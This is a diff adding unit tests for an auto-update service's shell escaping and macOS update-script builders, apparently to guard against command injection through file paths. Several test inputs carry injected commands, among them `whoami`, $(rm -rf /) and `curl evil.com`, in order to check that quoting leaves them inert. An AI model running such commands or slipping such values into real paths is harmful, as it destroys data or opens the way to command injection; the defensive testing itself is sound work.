@@ -1,5 +1,5 @@
 import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
-import { isNewerVersion, parseVersion, verifySHA256, appendTelemetryParams, isTransientError, withRetry } from './auto-update-service';
+import { isNewerVersion, parseVersion, verifySHA256, appendTelemetryParams, isTransientError, withRetry, shellEscape, buildMacUpdateScript, buildMacQuitUpdateScript } from './auto-update-service';
 import * as fs from 'fs';
 import * as path from 'path';
 import * as os from 'os';
@@ -350,6 +350,82 @@ describe('auto-update-service', () => {
       const expectedHash = crypto.createHash('sha256').update(buf).digest('hex');
       const result = await verifySHA256(tmpFile, expectedHash);
       expect(result).toBe(true);
+    });
+  });
+
+  describe('shellEscape', () => {
+    it('wraps simple strings in single quotes', () => {
+      expect(shellEscape('/Applications/MyApp.app')).toBe("'/Applications/MyApp.app'");
+    });
+
+    it('escapes single quotes within the string', () => {
+      expect(shellEscape("it's")).toBe("'it'\\''s'");
+    });
+
+    it('neutralizes backticks', () => {
+      const escaped = shellEscape('path/`whoami`/file');
+      expect(escaped).toBe("'path/`whoami`/file'");
+      // Inside single quotes, backticks are literal — no command substitution
+    });
+
+    it('neutralizes $() subshell syntax', () => {
+      const escaped = shellEscape('path/$(rm -rf /)/file');
+      expect(escaped).toBe("'path/$(rm -rf /)/file'");
+    });
+
+    it('neutralizes double quotes', () => {
+      const escaped = shellEscape('path "with" quotes');
+      expect(escaped).toBe("'path \"with\" quotes'");
+    });
+  });
+
+  describe('buildMacUpdateScript', () => {
+    it('uses single-quoted escaped paths', () => {
+      const script = buildMacUpdateScript(
+        '/Applications/My App.app',
+        '/tmp/New App.app',
+        '/tmp/extract',
+        '/tmp/download.zip',
+        '/tmp/script.sh',
+      );
+      expect(script).toContain("'/Applications/My App.app'");
+      expect(script).toContain("'/tmp/New App.app'");
+      expect(script).not.toContain('"');
+    });
+
+    it('prevents injection via malicious path with backticks', () => {
+      const script = buildMacUpdateScript(
+        '/Applications/`curl evil.com`.app',
+        '/tmp/new.app',
+        '/tmp/extract',
+        '/tmp/download.zip',
+        '/tmp/script.sh',
+      );
+      // Backticks are inside single quotes, so they're literal
+      expect(script).toContain("'/Applications/`curl evil.com`.app'");
+    });
+  });
+
+  describe('buildMacQuitUpdateScript', () => {
+    it('uses single-quoted escaped paths', () => {
+      const script = buildMacQuitUpdateScript(
+        '/Applications/My App.app',
+        '/tmp/download.zip',
+        '/tmp/extract',
+        '/tmp/script.sh',
+      );
+      expect(script).toContain("'/Applications/My App.app'");
+      expect(script).not.toContain('"/Applications/My App.app"');
+    });
+
+    it('prevents injection via $() in path', () => {
+      const script = buildMacQuitUpdateScript(
+        '/Applications/$(rm -rf /).app',
+        '/tmp/download.zip',
+        '/tmp/extract',
+        '/tmp/script.sh',
+      );
+      expect(script).toContain("'/Applications/$(rm -rf /).app'");
     });
   });
 });
